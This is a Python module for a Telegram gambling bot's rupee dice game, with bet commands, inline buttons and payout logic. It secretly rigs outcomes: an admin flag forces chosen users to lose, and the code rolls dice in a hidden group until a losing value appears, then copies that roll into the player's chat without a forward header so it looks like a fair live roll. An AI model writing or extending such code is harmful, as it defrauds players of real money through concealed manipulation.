import random
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from bot_instance import bot
from wallet import (
    get_balance,
    adjust_balance,
    reduce_wager_requirement,
    record_bet
)
from settings import get_min_bet, get_max_bet, get_house_edge
from middleware.admin import is_admin

# Optional: Set your rigging group ID here if not handled dynamically by /setwin
RIG_GROUP_ID = -1001234567890  # Replace with your actual secret rig group chat ID

# --- HELPERS FOR RIGGING & GAME LOGIC ---

def get_rigged_target(user_id: int) -> bool | None:
    """
    Checks if a forced win/loss outcome is set via /setwin.
    Returns True for forced WIN, False for forced LOSE, None for neutral/RNG.
    """
    try:
        from settings import get_user_rig_status  # Adjust import according to your settings structure
        return get_user_rig_status(user_id)
    except Exception:
        return None

def evaluate_dice_outcome(dice_value: int, bet_choice: str) -> tuple[bool, float]:
    """
    Evaluates dice value against bet choice.
    Returns (is_win, multiplier).
    """
    choice = str(bet_choice).lower().strip()
    
    if choice == "high":
        # High: 4, 5, 6
        is_win = dice_value in [4, 5, 6]
        return is_win, 1.95 if is_win else 0.0
    
    elif choice == "low":
        # Low: 1, 2, 3
        is_win = dice_value in [1, 2, 3]
        return is_win, 1.95 if is_win else 0.0
    
    elif choice == "even":
        # Even: 2, 4, 6
        is_win = (dice_value % 2 == 0)
        return is_win, 1.95 if is_win else 0.0
    
    elif choice == "odd":
        # Odd: 1, 3, 5
        is_win = (dice_value % 2 != 0)
        return is_win, 1.95 if is_win else 0.0
    
    elif choice in ["1", "2", "3", "4", "5", "6"]:
        # Specific Number
        target_num = int(choice)
        is_win = (dice_value == target_num)
        return is_win, 5.50 if is_win else 0.0

    return False, 0.0

def generate_dice_roll(user_id: int, bet_choice: str) -> int:
    """
    Rolls dice while respecting /setwin rigging setup.
    If forced lose is active, it generates dice outcomes that guarantee a loss.
    """
    rig_status = get_rigged_target(user_id)
    
    # 1. Force LOSE condition
    if rig_status is False:
        losing_outcomes = []
        for val in range(1, 7):
            is_win, _ = evaluate_dice_outcome(val, bet_choice)
            if not is_win:
                losing_outcomes.append(val)
        if losing_outcomes:
            return random.choice(losing_outcomes)

    # 2. Force WIN condition
    elif rig_status is True:
        winning_outcomes = []
        for val in range(1, 7):
            is_win, _ = evaluate_dice_outcome(val, bet_choice)
            if is_win:
                winning_outcomes.append(val)
        if winning_outcomes:
            return random.choice(winning_outcomes)

    # 3. Default Fair RNG
    return random.randint(1, 6)

def validate_bet_amount(user_id: int, amount: float) -> tuple[bool, str]:
    min_b = get_min_bet()
    max_b = get_max_bet(user_id)
    user_bal = get_balance(user_id)

    if amount < min_b:
        return False, f"⚠️ Minimum bet is ₹{min_b:.2f}"
    if amount > max_b:
        return False, f"⚠️ Maximum bet is ₹{max_b:.2f}"
    if amount > user_bal:
        return False, f"❌ Insufficient balance! You have ₹{user_bal:.2f}"
    
    return True, ""

def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
    """
    Sends dice animation. If forced loss is enabled, it rolls in the rig group
    and forwards the specific dice without revealing forwarded text.
    """
    rig_status = get_rigged_target(user_id)
    
    # If rigged to LOSE, send to secret group and forward to main chat
    if rig_status is False:
        try:
            target_val = generate_dice_roll(user_id, bet_choice)
            # Roll in secret group until getting target value
            for _ in range(10):
                msg = bot.send_dice(RIG_GROUP_ID, emoji="🎲")
                if msg.dice.value == target_val:
                    # Forward message without forward header using copy_message
                    forwarded = bot.copy_message(chat_id, RIG_GROUP_ID, msg.message_id)
                    return target_val
        except Exception:
            pass  # Fallback to direct roll if group forwarding fails

    # Normal Direct Roll
    msg = bot.send_dice(chat_id, emoji="🎲")
    return msg.dice.value

# --- INLINE KEYBOARD UI ---

def get_bet_selection_keyboard(amount: float) -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"🔴 High (4-6) [1.95x]", callback_data=f"dr_{amount}_high"),
        InlineKeyboardButton(f"🔵 Low (1-3) [1.95x]", callback_data=f"dr_{amount}_low"),
        InlineKeyboardButton(f"🟣 Even [1.95x]", callback_data=f"dr_{amount}_even"),
        InlineKeyboardButton(f"🟡 Odd [1.95x]", callback_data=f"dr_{amount}_odd"),
    )
    num_buttons = [InlineKeyboardButton(f"🎲 {i} [5.5x]", callback_data=f"dr_{amount}_{i}") for i in range(1, 7)]
    markup.add(*num_buttons)
    return markup

def send_dr_guide(message: Message):
    guide_text = (
        "🎲 <b>Dice Roll (/dr) Guide</b>\n\n"
        "<b>Usage Options:</b>\n"
        "• <code>/dr &lt;amount&gt; &lt;choice&gt;</code> — Bet directly\n"
        "• <code>/dr &lt;amount&gt;</code> — Open inline bet selection\n"
        "• <code>/dr</code> — Show this guide\n\n"
        "<b>Choices & Payouts:</b>\n"
        "• <code>high</code> (4, 5, 6) → <b>1.95x</b>\n"
        "• <code>low</code> (1, 2, 3) → <b>1.95x</b>\n"
        "• <code>even</code> (2, 4, 6) → <b>1.95x</b>\n"
        "• <code>odd</code> (1, 3, 5) → <b>1.95x</b>\n"
        "• <code>1-6</code> (Specific Number) → <b>5.50x</b>\n\n"
        "<b>Aliases:</b> /diceroll"
    )
    bot.reply_to(message, guide_text, parse_mode="HTML")

# --- CORE GAME EXECUTION ---

def process_dice_bet(chat_id: int, user_id: int, amount: float, choice: str, reply_to_id: int = None):
    # Re-validate balance before executing
    valid, err_msg = validate_bet_amount(user_id, amount)
    if not valid:
        bot.send_message(chat_id, err_msg, reply_to_message_id=reply_to_id)
        return

    # Deduct bet balance upfront
    adjust_balance(user_id, -amount)

    # Send dice roll
    dice_val = send_dice_animation(chat_id, user_id, choice)
    
    # Evaluate win/loss
    is_win, multiplier = evaluate_dice_outcome(dice_val, choice)
    payout = amount * multiplier if is_win else 0.0

    # Build result string
    result_str = "WIN" if is_win else "LOSE"

    if is_win:
        adjust_balance(user_id, payout)
        res_msg = (
            f"🎲 <b>Dice Roll Result: {dice_val}</b>\n"
            f"🎯 Choice: <code>{choice.upper()}</code>\n"
            f"🎉 <b>You WON ₹{payout:.2f}!</b> (Multiplier: {multiplier}x)"
        )
    else:
        # Reduce wager requirement ONLY on Loss
        reduce_wager_requirement(user_id, amount)
        res_msg = (
            f"🎲 <b>Dice Roll Result: {dice_val}</b>\n"
            f"🎯 Choice: <code>{choice.upper()}</code>\n"
            f"❌ <b>You Lost ₹{amount:.2f}!</b>"
        )

    # Record in Database
    record_bet(
        telegram_id=user_id,
        game="dice_roll",
        bet_amount=amount,
        payout=payout,
        result=result_str,
        meta={"choice": choice, "rolled": dice_val}
    )

    bot.send_message(chat_id, res_msg, reply_to_message_id=reply_to_id, parse_mode="HTML")

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=["dr", "diceroll"])
def handle_dr_command(message: Message):
    parts = message.text.split()

    # 1. /dr -> Show Guide
    if len(parts) == 1:
        send_dr_guide(message)
        return

    user_id = message.from_user.id
    amount_str = parts[1]

    # Resolve amount (supports numbers, 'all', 'half')
    try:
        from wallet import resolve_amount
        amount = resolve_amount(user_id, amount_str)
    except Exception:
        try:
            amount = float(amount_str)
        except ValueError:
            amount = None

    if amount is None or amount <= 0:
        bot.reply_to(message, "❌ Invalid bet amount entered.")
        return

    # Validate bet limits & balance
    valid, err_msg = validate_bet_amount(user_id, amount)
    if not valid:
        bot.reply_to(message, err_msg)
        return

    # 2. /dr <amt> -> Show Inline Choice Buttons
    if len(parts) == 2:
        kb = get_bet_selection_keyboard(amount)
        bot.reply_to(message, f"🎲 <b>Place your bet for ₹{amount:.2f}:</b>\nChoose an option below:", reply_markup=kb, parse_mode="HTML")
        return

    # 3. /dr <amt> <choice> -> Direct Bet Execution
    choice = parts[2].lower().strip()
    valid_choices = ["high", "low", "even", "odd", "1", "2", "3", "4", "5", "6"]
    
    if choice not in valid_choices:
        bot.reply_to(message, "❌ Invalid choice! Pick: <code>high</code>, <code>low</code>, <code>even</code>, <code>odd</code>, or <code>1-6</code>.", parse_mode="HTML")
        return

    process_dice_bet(message.chat.id, user_id, amount, choice, reply_to_id=message.message_id)

# --- CALLBACK HANDLER FOR INLINE BUTTONS ---

@bot.callback_query_handler(func=lambda call: call.data.startswith("dr_"))
def handle_dr_callback(call: CallbackQuery):
    user_id = call.from_user.id
    parts = call.data.split("_")  # Format: dr_<amount>_<choice>

    if len(parts) < 3:
        bot.answer_callback_query(call.id, "Invalid action.")
        return

    try:
        amount = float(parts[1])
        choice = parts[2]
    except ValueError:
        bot.answer_callback_query(call.id, "Invalid data.")
        return

    # Delete inline message to prevent duplicate clicks
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

    process_dice_bet(call.message.chat.id, user_id, amount, choice)
